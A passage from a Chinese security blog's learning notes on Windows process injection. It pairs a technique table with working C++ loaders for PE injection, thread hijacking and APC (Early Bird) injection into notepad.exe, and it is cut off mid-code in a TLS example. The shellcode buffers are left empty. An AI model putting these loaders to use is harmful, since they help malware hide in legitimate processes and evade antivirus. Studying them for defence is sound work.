协议安全笔记-RMI篇</a></p>\n<p><a href=\"https://xz.aliyun.com/t/7930#toc-14\">针对RMI服务的九重攻击上</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s/M_-lWKb9xO6u2MxRaEQ--Q\">【技术干货】RMI-攻击方式总结</a></p>\n<p><a href=\"https://www.anquanke.com/post/id/257452#h2-0\">RMI-攻击方式总结</a></p>\n","categories":["Java反序列化"]},{"title":"Process-Inject-贰","url":"/2024/09/03/Process-Injection2/","content":"<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/darkwork.jpg\" alt=\"darkwork\"></p>\n<a id=\"more\"></a>\n\n<h1 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h1><p>学习代码放在：<a href=\"https://github.com/yongsheng220/ProcessInject\">https://github.com/yongsheng220/ProcessInject</a></p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">名称</th>\n<th align=\"center\">概述</th>\n<th align=\"left\">Windows APIs</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">经典DLL注入</td>\n<td align=\"center\">通过dll落地，远程调用LoadLibrary加载恶意dll</td>\n<td align=\"left\">OpenProcess<br />VirtualAllocEx<br />WriteProcessMemory<br />CreateRemoteThread<br />LoadLibrary</td>\n</tr>\n<tr>\n<td align=\"center\">反射DLL注入</td>\n<td align=\"center\">通过远程调用自定义ReflectiveLoader函数模拟PE加载过程</td>\n<td align=\"left\">OpenProcess<br />VirtualAllocEx<br />WriteProcessMemory<br />CreateRemoteThread</td>\n</tr>\n<tr>\n<td align=\"center\">Dll Hollowing</td>\n<td align=\"center\">通过镂空加载的合法DLL，执行恶意代码</td>\n<td align=\"left\">LoadLibraryEx<br />NtCreateSection + NtMapViewOfSection<br />CreateThread</td>\n</tr>\n<tr>\n<td align=\"center\">PE注入</td>\n<td align=\"center\">通过将恶意PE写到远程目标后，创建线程执行恶意方法</td>\n<td align=\"left\">OpenProcess<br />VirtualAllocEx<br />WriteProcessMemory<br />CreateRemoteThread</td>\n</tr>\n<tr>\n<td align=\"center\">线程注入</td>\n<td align=\"center\">通过暂停远程线程，将eip/rip指向写入的shellcode</td>\n<td align=\"left\">OpenThread<br />SuspendThread<br />VirtualAllocEx<br />WriteProcessMemory<br />SetThreadContext<br />ResumeThread</td>\n</tr>\n<tr>\n<td align=\"center\">APC注入</td>\n<td align=\"center\">APC机制执行</td>\n<td align=\"left\">OpenProcess/OpenThread<br />VirtualAllocEx<br />WriteProcessMemory<br />QueueUserAPC</td>\n</tr>\n<tr>\n<td align=\"center\">TLS注入</td>\n<td align=\"center\">TLS机制执行</td>\n<td align=\"left\"></td>\n</tr>\n<tr>\n<td align=\"center\">Process Hollowing</td>\n<td align=\"center\">通过创建挂起进程，卸载源PE，写入恶意PE</td>\n<td align=\"left\">CreateProcess<br />NtUnmapViewOfSection<br />VirtualAllocEx<br />WriteProcessMemory</td>\n</tr>\n<tr>\n<td align=\"center\">Process Overwriting</td>\n<td align=\"center\">直接将恶意PE覆写源PE</td>\n<td align=\"left\">CreateProcess<br />VirtualProtectEx<br />WriteProcessMemory<br />ResumeThread</td>\n</tr>\n<tr>\n<td align=\"center\">Process Stomping</td>\n<td align=\"center\">将shellcode写到滥用RWX属性的PE中</td>\n<td align=\"left\">CreateProcess <br />WriteProcessMemory<br />ResumeThread</td>\n</tr>\n<tr>\n<td align=\"center\">Process Doppelganging</td>\n<td align=\"center\">利用事务NTFS回滚特性，优化内存属性</td>\n<td align=\"left\">CreateTransaction<br />CreateFileTransactedW<br />RollbackTransaction<br />NtCreateProcessEx<br />NtCreateThreadEx</td>\n</tr>\n<tr>\n<td align=\"center\">Transacted Hollowing</td>\n<td align=\"center\">Hollowing 和 Doppelganging的综合优化</td>\n<td align=\"left\"></td>\n</tr>\n<tr>\n<td align=\"center\">Process Ghosting</td>\n<td align=\"center\">利用文件删除标志位，”无文件”落地</td>\n<td align=\"left\">NtSetInformationFile<br />NtCreateProcessEx<br />NtCreateThreadEx</td>\n</tr>\n<tr>\n<td align=\"center\">Ghostly Hollowing</td>\n<td align=\"center\">Process Ghosting优化</td>\n<td align=\"left\"></td>\n</tr>\n</tbody></table>\n<h1 id=\"PE注入\"><a href=\"#PE注入\" class=\"headerlink\" title=\"PE注入\"></a>PE注入</h1><p>原理见图：通过 <strong>OpenProcess、VirtualAllocEx、WriteProcessMemory、CreateRemoteThread</strong> 系列API进行远程注入</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/pe-injection.gif\" alt=\"pe-injection\"></p>\n<h2 id=\"常规注入PE\"><a href=\"#常规注入PE\" class=\"headerlink\" title=\"常规注入PE\"></a>常规注入PE</h2><p>将自身作为携带恶意函数的PE写到目标进程中通过处理重定位表后执行恶意方法</p>\n<p>流程如下：</p>\n<ul>\n<li><p>OpenProcess 打开目标进程</p>\n</li>\n<li><p>VirtualAllocEx 开辟空间</p>\n</li>\n<li><p>修复重定位</p>\n</li>\n<li><p>WriteProcessMemory 写入恶意PE</p>\n</li>\n<li><p>CreateRemoteThread 执行恶意代码</p>\n</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;Windows.h&gt;</span><br><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">#include &lt;tlhelp32.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\"></span><br><span class=\"line\">typedef struct BASE_RELOCATION_ENTRY &#123;</span><br><span class=\"line\">    USHORT Offset : 12;</span><br><span class=\"line\">    USHORT Type : 4;</span><br><span class=\"line\">&#125; BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;</span><br><span class=\"line\">&#x2F;&#x2F; 恶意方法</span><br><span class=\"line\">DWORD InjectionEntryPoint()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    CHAR moduleName[128] &#x3D; &quot;&quot;;</span><br><span class=\"line\">    GetModuleFileNameA(NULL, moduleName, sizeof(moduleName));</span><br><span class=\"line\">    MessageBoxA(NULL, moduleName, &quot;Obligatory PE Injection&quot;, NULL);</span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">BOOL PrivilegeEscalation()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    HANDLE hToken;</span><br><span class=\"line\">    LUID luid;</span><br><span class=\"line\">    TOKEN_PRIVILEGES tp;</span><br><span class=\"line\">    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken);</span><br><span class=\"line\">    LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;luid);</span><br><span class=\"line\">    tp.PrivilegeCount &#x3D; 1;</span><br><span class=\"line\">    tp.Privileges[0].Attributes &#x3D; SE_PRIVILEGE_ENABLED;</span><br><span class=\"line\">    tp.Privileges[0].Luid &#x3D; luid;</span><br><span class=\"line\">    if (!AdjustTokenPrivileges(hToken, 0, &amp;tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) &#123;</span><br><span class=\"line\">        CloseHandle(hToken);</span><br><span class=\"line\">        return FALSE;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    else &#123;</span><br><span class=\"line\">        cout &lt;&lt; &quot;[+]提权成功&quot; &lt;&lt; endl;</span><br><span class=\"line\">        return TRUE;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">DWORD GetProcessPID(LPCSTR lpProcessName)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    DWORD rPid &#x3D; 0;</span><br><span class=\"line\">    &#x2F;&#x2F; 初始化结构体信息，用于枚举进程</span><br><span class=\"line\">    PROCESSENTRY32 processEntry;</span><br><span class=\"line\">    processEntry.dwSize &#x3D; sizeof(PROCESSENTRY32);</span><br><span class=\"line\"></span><br><span class=\"line\">    HANDLE lpSnapshot &#x3D; CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);</span><br><span class=\"line\">    if (lpSnapshot &#x3D;&#x3D; INVALID_HANDLE_VALUE) &#123; cout &lt;&lt; &quot;[-]创建快照失败&quot; &lt;&lt; endl; return 0; &#125;</span><br><span class=\"line\">    if (Process32First(lpSnapshot, &amp;processEntry)) &#123;</span><br><span class=\"line\">        do &#123;</span><br><span class=\"line\">            if (lstrcmp(processEntry.szExeFile, lpProcessName) &#x3D;&#x3D; 0) &#123;</span><br><span class=\"line\">                rPid &#x3D; processEntry.th32ProcessID;</span><br><span class=\"line\">                break;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; while (Process32Next(lpSnapshot, &amp;processEntry));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    CloseHandle(lpSnapshot);</span><br><span class=\"line\">    cout &lt;&lt; &quot;[*]PID: &quot; &lt;&lt; rPid &lt;&lt; endl;</span><br><span class=\"line\">    return rPid;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    LPCSTR name &#x3D; &quot;notepad.exe&quot;;</span><br><span class=\"line\">    &#x2F;&#x2F; 提升当前进程权限</span><br><span class=\"line\">    if (!PrivilegeEscalation()) &#123; cout &lt;&lt; &quot;[-]提升权限失败&quot; &lt;&lt; endl; return 1; &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    PVOID imageBase &#x3D; GetModuleHandle(NULL);</span><br><span class=\"line\">    PIMAGE_DOS_HEADER dosHeader &#x3D; (PIMAGE_DOS_HEADER)imageBase;</span><br><span class=\"line\">    PIMAGE_NT_HEADERS ntHeader &#x3D; (PIMAGE_NT_HEADERS)((BYTE*)imageBase + dosHeader-&gt;e_lfanew);</span><br><span class=\"line\"></span><br><span class=\"line\">    PVOID localImage &#x3D; VirtualAlloc(NULL, ntHeader-&gt;OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_READWRITE);</span><br><span class=\"line\">    memcpy(localImage, imageBase, ntHeader-&gt;OptionalHeader.SizeOfImage);</span><br><span class=\"line\"></span><br><span class=\"line\">    DWORD Pid &#x3D; GetProcessPID(name);</span><br><span class=\"line\">    if (Pid &#x3D;&#x3D; 0) &#123; cout &lt;&lt; &quot;[-]获取PID失败&quot; &lt;&lt; endl; return 1; &#125;</span><br><span class=\"line\">    HANDLE hProcess &#x3D; OpenProcess(MAXIMUM_ALLOWED, FALSE, Pid);</span><br><span class=\"line\">    if (hProcess &#x3D;&#x3D; INVALID_HANDLE_VALUE) &#123; cout &lt;&lt; &quot;[-]打开进程失败&quot; &lt;&lt; endl; return 1; &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    PVOID tarImageBase &#x3D; VirtualAllocEx(hProcess, NULL, ntHeader-&gt;OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">    DWORD_PTR offset &#x3D; (DWORD_PTR)tarImageBase - (DWORD_PTR)imageBase;</span><br><span class=\"line\">    cout &lt;&lt; &quot;[*]tarImageBase: &quot; &lt;&lt; tarImageBase &lt;&lt; endl;</span><br><span class=\"line\">    cout &lt;&lt; &quot;[*]localImage: &quot; &lt;&lt; localImage &lt;&lt; endl;</span><br><span class=\"line\">    cout &lt;&lt; &quot;[*]Offset: &quot; &lt;&lt; hex &lt;&lt; offset &lt;&lt; endl;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F;获取重定位表</span><br><span class=\"line\">    PIMAGE_BASE_RELOCATION relocationTable &#x3D; (PIMAGE_BASE_RELOCATION)((DWORD_PTR)localImage + ntHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);</span><br><span class=\"line\">    DWORD relocationEntriesCount &#x3D; 0;</span><br><span class=\"line\">    PDWORD_PTR patchedAddress;</span><br><span class=\"line\">    PBASE_RELOCATION_ENTRY relocationRVA &#x3D; NULL;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F;遍历重定位块</span><br><span class=\"line\">    while (relocationTable-&gt;SizeOfBlock &gt; 0)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        &#x2F;&#x2F; 获取重定位块中包含的重定位项的数量</span><br><span class=\"line\">        relocationEntriesCount &#x3D; (relocationTable-&gt;SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) &#x2F; sizeof(USHORT);</span><br><span class=\"line\">        relocationRVA &#x3D; (PBASE_RELOCATION_ENTRY)(relocationTable + 1);</span><br><span class=\"line\"></span><br><span class=\"line\">        for (short i &#x3D; 0; i &lt; relocationEntriesCount; i++)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            if (relocationRVA[i].Offset)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                patchedAddress &#x3D; (PDWORD_PTR)((DWORD_PTR)localImage + relocationTable-&gt;VirtualAddress + relocationRVA[i].Offset);</span><br><span class=\"line\">                *patchedAddress +&#x3D; offset;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        relocationTable &#x3D; (PIMAGE_BASE_RELOCATION)((DWORD_PTR)relocationTable + relocationTable-&gt;SizeOfBlock);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    WriteProcessMemory(hProcess, tarImageBase, localImage, ntHeader-&gt;OptionalHeader.SizeOfImage, NULL);</span><br><span class=\"line\">    &#x2F;&#x2F;memset(localImage, 0, ntHeader-&gt;OptionalHeader.SizeOfImage);</span><br><span class=\"line\">    VirtualFree(localImage, 0, MEM_RELEASE);</span><br><span class=\"line\">    </span><br><span class=\"line\">    &#x2F;&#x2F; 本地InjectionEntryPoint + offset &#x3D; 远程InjectionEntryPoint</span><br><span class=\"line\">    HANDLE hRemoteHandle &#x3D; CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((DWORD_PTR)InjectionEntryPoint + offset), NULL, 0, NULL);</span><br><span class=\"line\">    if (hRemoteHandle &#x3D;&#x3D; INVALID_HANDLE_VALUE) &#123; cout &lt;&lt; &quot;[-]创建远程线程失败&quot; &lt;&lt; endl; return 1; &#125;</span><br><span class=\"line\">    WaitForSingleObject(hRemoteHandle, INFINITE);</span><br><span class=\"line\">    CloseHandle(hRemoteHandle);</span><br><span class=\"line\"></span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240831234806964.png\" alt=\"image-20240831234806964\"></p>\n<h2 id=\"变体注入shellcode\"><a href=\"#变体注入shellcode\" class=\"headerlink\" title=\"变体注入shellcode\"></a>变体注入shellcode</h2><p>如果只执行shellcode，就不用繁杂的处理PE，只要远程写入、远程调用即可。</p>\n<p>流程如下：</p>\n<ul>\n<li><p>OpenProcess 打开目标进程</p>\n</li>\n<li><p>VirtualAllocEx 开辟空间</p>\n</li>\n<li><p>WriteProcessMemory 写入shellcode</p>\n</li>\n<li><p>CreateRemoteThread 执行shellcode</p>\n</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    &#x2F;&#x2F; 提升当前进程权限</span><br><span class=\"line\">    if (!PrivilegeEscalation()) &#123;cout &lt;&lt; &quot;[-]提升权限失败&quot; &lt;&lt; endl;return 1;&#125;</span><br><span class=\"line\">    &#x2F;&#x2F; 要注入的进程名字</span><br><span class=\"line\">    LPCSTR tname &#x3D; &quot;notepad.exe&quot;;</span><br><span class=\"line\">    DWORD Pid &#x3D; GetProcessPID(tname);</span><br><span class=\"line\">    if (Pid &#x3D;&#x3D; NULL) &#123; cout &lt;&lt; &quot;[-]获取PID失败&quot; &lt;&lt; endl; return 1; &#125;</span><br><span class=\"line\">    HANDLE hProcess &#x3D; OpenProcess(PROCESS_ALL_ACCESS, FALSE, Pid);</span><br><span class=\"line\">    if (hProcess &#x3D;&#x3D; INVALID_HANDLE_VALUE)&#123;cout &lt;&lt; &quot;[-]打开进程失败&quot; &lt;&lt; endl;return 1;&#125;</span><br><span class=\"line\">    SIZE_T length &#x3D; sizeof(shellcode);</span><br><span class=\"line\">    LPVOID pshellcode &#x3D; VirtualAllocEx(hProcess, NULL, length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">    WriteProcessMemory(hProcess, pshellcode, shellcode, length, NULL);</span><br><span class=\"line\">    HANDLE hRemoteHandle &#x3D; CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pshellcode, NULL, 0, NULL);</span><br><span class=\"line\">    WaitForSingleObject(hRemoteHandle, INFINITE);</span><br><span class=\"line\">    CloseHandle(hRemoteHandle);</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h1 id=\"线程劫持\"><a href=\"#线程劫持\" class=\"headerlink\" title=\"线程劫持\"></a>线程劫持</h1><p>原理如图：通过  SuspendThread、GetThreadContext、修改上下文eip/rip、SetThreadContext、ResumeThread恢复线程执行shellcode 进行远程注入</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/thread-hijack.gif\" alt=\"thread-hijack\"></p>\n<p>代码：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">unsigned char shellcode[] &#x3D; &quot;&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">LPCSTR name &#x3D; &quot;notepad.exe&quot;;</span><br><span class=\"line\">DWORD targetPID &#x3D; GetProcessPID(name);</span><br><span class=\"line\"></span><br><span class=\"line\">HANDLE threadHijacked &#x3D; NULL;</span><br><span class=\"line\">THREADENTRY32 threadEntry;</span><br><span class=\"line\">CONTEXT context;</span><br><span class=\"line\">context.ContextFlags &#x3D; CONTEXT_FULL;</span><br><span class=\"line\">threadEntry.dwSize &#x3D; sizeof(THREADENTRY32);</span><br><span class=\"line\"></span><br><span class=\"line\">HANDLE targetProcessHandle &#x3D; OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);</span><br><span class=\"line\">if (targetProcessHandle &#x3D;&#x3D; INVALID_HANDLE_VALUE) &#123; cout &lt;&lt; &quot;[-]打开进程失败&quot; &lt;&lt; endl; return 0; &#125;</span><br><span class=\"line\">PVOID remoteBuffer &#x3D; VirtualAllocEx(targetProcessHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">WriteProcessMemory(targetProcessHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);</span><br><span class=\"line\"></span><br><span class=\"line\">HANDLE snapshot &#x3D; CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);</span><br><span class=\"line\">Thread32First(snapshot, &amp;threadEntry);</span><br><span class=\"line\"></span><br><span class=\"line\">while (Thread32Next(snapshot, &amp;threadEntry))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if (threadEntry.th32OwnerProcessID &#x3D;&#x3D; targetPID)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        threadHijacked &#x3D; OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID);</span><br><span class=\"line\">        if (threadHijacked &#x3D;&#x3D; INVALID_HANDLE_VALUE) &#123; cout &lt;&lt; &quot;[-]打开线程失败&quot; &lt;&lt; endl; return 0; &#125;</span><br><span class=\"line\">        break;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">SuspendThread(threadHijacked);</span><br><span class=\"line\"></span><br><span class=\"line\">GetThreadContext(threadHijacked, &amp;context);</span><br><span class=\"line\">context.Rip &#x3D; (DWORD_PTR)remoteBuffer;</span><br><span class=\"line\">SetThreadContext(threadHijacked, &amp;context);</span><br><span class=\"line\"></span><br><span class=\"line\">ResumeThread(threadHijacked);</span><br><span class=\"line\"></span><br><span class=\"line\">return 0;</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"APC注入\"><a href=\"#APC注入\" class=\"headerlink\" title=\"APC注入\"></a>APC注入</h1><p>APC是在某一个进程中的N多线程各自维护一个任务队列，用于异步回调，当线程处于alertable状态时，执行队列里的任务的一种机制。</p>\n<p>APC注入简单来说就是往队列里插入执行shellcode的任务。</p>\n<p>常规的APC进程注入具有不确定性，需要线程能够处于alertable状态，而处于该状态是需要一些特定函数的：ReadFileEx,SetWaitableTimer, SetWaitableTimerEx和WriteFileEx等 ，所以常规是注入到explorer.exe下的所有线程中，故不再记录。</p>\n<p>这里直接记录比较实用的两种技术：<strong>Early Bird远程进程注入</strong> 和 <strong>本地进程注入</strong>，在这之前要先介绍 <strong>NtTestAlert 函数</strong>，该函数是ntdll中一个未导出函数，<strong>会在线程初始化时进行调用</strong>，作用是清空并处理APC队列内任务，所以会在进程的主线程入口点之前运行任务并接管进程控制权。具体调用链为：<strong>LdrInitializeThunk → LdrpInitialize → _LdrpInitialize → NtTestAlert → KiUserApcDispatcher</strong></p>\n<h2 id=\"Early-Bird\"><a href=\"#Early-Bird\" class=\"headerlink\" title=\"Early Bird\"></a>Early Bird</h2><p><strong>Early Bird 远程注入原理</strong> ：创建一个主线程挂起的进程，然后恢复线程进行初始化，调用NtTestAlert执行shellcode</p>\n<p>流程如下：</p>\n<ul>\n<li><p>创建一个挂起的进程(通常是windows的合法进程)，如svchost</p>\n</li>\n<li><p>在挂起的进程内申请一块可读可写可执行的内存空间</p>\n</li>\n<li><p>往申请的空间内写入shellcode</p>\n</li>\n<li><p>将APC插入到该进程的主线程</p>\n</li>\n<li><p>恢复挂起进程的线程</p>\n</li>\n<li><p>ResumeThread调用NtTestAlert</p>\n</li>\n<li><p>处理APC队列</p>\n</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;Windows.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    unsigned char buf[] &#x3D; &quot;xxx&quot;;</span><br><span class=\"line\">    SIZE_T shellSize &#x3D; sizeof(buf);</span><br><span class=\"line\">    STARTUPINFOA si &#x3D; &#123; 0 &#125;;</span><br><span class=\"line\">    PROCESS_INFORMATION pi &#x3D; &#123; 0 &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    CreateProcessA(&quot;C:\\\\Windows\\\\System32\\\\notepad.exe&quot;, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &amp;si, &amp;pi);</span><br><span class=\"line\">    HANDLE victimProcess &#x3D; pi.hProcess;</span><br><span class=\"line\">    HANDLE threadHandle &#x3D; pi.hThread;</span><br><span class=\"line\"></span><br><span class=\"line\">    LPVOID shellAddress &#x3D; VirtualAllocEx(victimProcess, NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">    PTHREAD_START_ROUTINE apcRoutine &#x3D; (PTHREAD_START_ROUTINE)shellAddress;</span><br><span class=\"line\"></span><br><span class=\"line\">    WriteProcessMemory(victimProcess, shellAddress, buf, shellSize, NULL);</span><br><span class=\"line\">    QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);</span><br><span class=\"line\">    ResumeThread(threadHandle);</span><br><span class=\"line\"></span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>因为这样要创建一个新的进程，很有可能会有窗口体显示，所以还可以在 已存在进程中注入</p>\n<ul>\n<li><p>在已有进程中创建一个挂起的线程</p>\n</li>\n<li><p>写入shellcode</p>\n</li>\n<li><p>插入apc队列</p>\n</li>\n<li><p>恢复挂起的线程</p>\n</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    unsigned char shellcode[] &#x3D; &quot;&quot;;</span><br><span class=\"line\">    LPCSTR name &#x3D; &quot;notepad.exe&quot;;</span><br><span class=\"line\">    DWORD targetPID &#x3D; GetProcessPID(name);</span><br><span class=\"line\">    HANDLE hProcess &#x3D; OpenProcess(PROCESS_ALL_ACCESS, NULL, targetPID);</span><br><span class=\"line\">    PVOID AllocAddr &#x3D; VirtualAllocEx(hProcess, 0, sizeof(shellcode) + 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">    WriteProcessMemory(hProcess, AllocAddr, shellcode, sizeof(shellcode) + 1, 0);</span><br><span class=\"line\">    system(&quot;pause&quot;);</span><br><span class=\"line\">    HANDLE hThread &#x3D; CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)0xfff, 0, CREATE_SUSPENDED, NULL);</span><br><span class=\"line\">    &#x2F;&#x2F;插入APC队列</span><br><span class=\"line\">    QueueUserAPC((PAPCFUNC)AllocAddr, hThread, 0);</span><br><span class=\"line\">    system(&quot;pause&quot;);</span><br><span class=\"line\">    &#x2F;&#x2F;恢复线程触发APC执行</span><br><span class=\"line\">    ResumeThread(hThread);</span><br><span class=\"line\">    &#x2F;&#x2F;WaitForSingleObject(hThread,INFINITE);</span><br><span class=\"line\">    &#x2F;&#x2F;CloseHandle(hProcess);</span><br><span class=\"line\">    CloseHandle(hThread);</span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>注入notepad.exe</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/QQ_1721143608451.png\" alt=\"QQ_1721143608451\"></p>\n<h2 id=\"本地进程注入\"><a href=\"#本地进程注入\" class=\"headerlink\" title=\"本地进程注入\"></a>本地进程注入</h2><p><strong>本地进程注入原理</strong>：自身主动调用NtTestAlert处理APC，相关代码在《免杀入门》出现过</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;Windows.h&gt;</span><br><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">typedef DWORD(WINAPI* pNtTestAlert)();</span><br><span class=\"line\"></span><br><span class=\"line\">unsigned char buf[] &#x3D; &quot;shellcode is here&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">int main() </span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    &#x2F;&#x2F; 修改 shellcode 所在内存区域的保护属性，允许执行</span><br><span class=\"line\">    DWORD oldProtect;</span><br><span class=\"line\">    VirtualProtect((LPVOID)buf, sizeof(buf), PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F;获取NtTestAlert函数地址, 因为它是一个内部函数.无法直接通过函数名调用</span><br><span class=\"line\">    pNtTestAlert NtTestAlert &#x3D; (pNtTestAlert)(GetProcAddress(GetModuleHandleA(&quot;ntdll&quot;), &quot;NtTestAlert&quot;));</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F; 将buf强转为APC 函数,向当前线程的异步过程调用(APC)队列添加一个执行shellcode的任务</span><br><span class=\"line\">    QueueUserAPC((PAPCFUNC)buf, GetCurrentThread(), NULL);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F;调用NtTestAlert，触发 APC 队列中的任务执行（即执行 shellcode）</span><br><span class=\"line\">    NtTestAlert();</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"TLS注入\"><a href=\"#TLS注入\" class=\"headerlink\" title=\"TLS注入\"></a>TLS注入</h1><p>关于TLS，个人认为算不上是进程注入的一种技术，更像是一种能够代码执行的机制，TLS机制在《免杀入门》已经有过介绍，这里引用：</p>\n<p><a href=\"https://idiotc4t.com/code-and-dll-process-injection/tls-code-execute\">https://idiotc4t.com/code-and-dll-process-injection/tls-code-execute</a> 代码，实现 TLS机制+mapping技术进行进程注入。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;Windows.h&gt;</span><br><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\">#pragma comment(linker, &quot;&#x2F;section:.data,RWE&quot;) </span><br><span class=\"line\">#pragma comment (lib, &quot;OneCore.lib&quot;)</span><br><span class=\"line\">#include &lt;Tlhelp32.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">char shellcode[] &#x3D; &quot;&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">DWORD pid;</span><br><span class=\"line\">VOID NTAPI TlsCallBack(PVOID DllHandle, DWORD dwReason, PVOID Reserved) </span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tWCHAR lpszProcessName[] &#x3D; L&quot;notepad.exe&quot;;</span><br><span class=\"line\">\tif (dwReason &#x3D;&#x3D; DLL_PROCESS_ATTACH)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tHANDLE hSnapshot &#x3D; CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);</span><br><span class=\"line\">\t\tPROCESSENTRY32 pe;</span><br><span class=\"line\">\t\tpe.dwSize &#x3D; sizeof pe;</span><br><span class=\"line\">\t\tif (Process32First(hSnapshot, &amp;pe))</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tdo &#123;</span><br><span class=\"line\">\t\t\t\tif (lstrcmpi(lpszProcessName, 